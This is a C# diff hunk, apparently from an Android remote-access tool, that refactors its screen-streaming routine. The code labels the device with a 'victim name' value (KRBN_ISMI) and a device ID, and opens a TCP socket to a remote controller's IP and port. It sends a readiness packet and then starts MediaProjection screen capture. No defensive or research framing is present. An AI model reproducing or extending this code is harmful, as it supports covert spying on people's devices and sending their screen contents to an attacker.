@@ -33,18 +33,18 @@ namespace Task2
                 {
                     try
                     {
-                        ImageAvailableListener.ID = MainValues.KRBN_ISMI + "_" + ForegroundService._globalService.GetIdentifier();
-                        ImageAvailableListener.screenSock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+                        ForegroundService._globalService.ID = MainValues.KRBN_ISMI + "_" + ForegroundService._globalService.GetIdentifier();
+                        ForegroundService._globalService.screenSock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                         IPAddress ipadresi_dosya = Dns.GetHostAddresses(MainValues.IP)[0];
                         IPEndPoint endpoint_dosya = new IPEndPoint(ipadresi_dosya, MainValues.port);
-                        ImageAvailableListener.screenSock.SendBufferSize = int.MaxValue;
-                        ImageAvailableListener.screenSock.SendTimeout = -1;
-                        ImageAvailableListener.screenSock.NoDelay = true;
-                        ForegroundService._globalService.SetKeepAlive(ImageAvailableListener.screenSock, 2000, 1000);
-                        ImageAvailableListener.screenSock.Connect(endpoint_dosya);
+                        ForegroundService._globalService.screenSock.SendBufferSize = int.MaxValue;
+                        ForegroundService._globalService.screenSock.SendTimeout = -1;
+                        ForegroundService._globalService.screenSock.NoDelay = true;
+                        ForegroundService._globalService.SetKeepAlive(ForegroundService._globalService.screenSock, 2000, 1000);
+                        ForegroundService._globalService.screenSock.Connect(endpoint_dosya);
 
-                        byte[] myScreenReady = ForegroundService._globalService.MyDataPacker("MYSCREENREADY", System.Text.Encoding.UTF8.GetBytes("ECHO"), ImageAvailableListener.ID);
-                        ImageAvailableListener.screenSock.Send(myScreenReady, 0, myScreenReady.Length, SocketFlags.None);
+                        byte[] myScreenReady = ForegroundService._globalService.MyDataPacker("MYSCREENREADY", System.Text.Encoding.UTF8.GetBytes("ECHO"), ForegroundService._globalService.ID);
+                        ForegroundService._globalService.screenSock.Send(myScreenReady, 0, myScreenReady.Length, SocketFlags.None);
 
                         ForegroundService.sMediaProjection = ForegroundService.mProjectionManager.GetMediaProjection((int)resultCode, data);
 
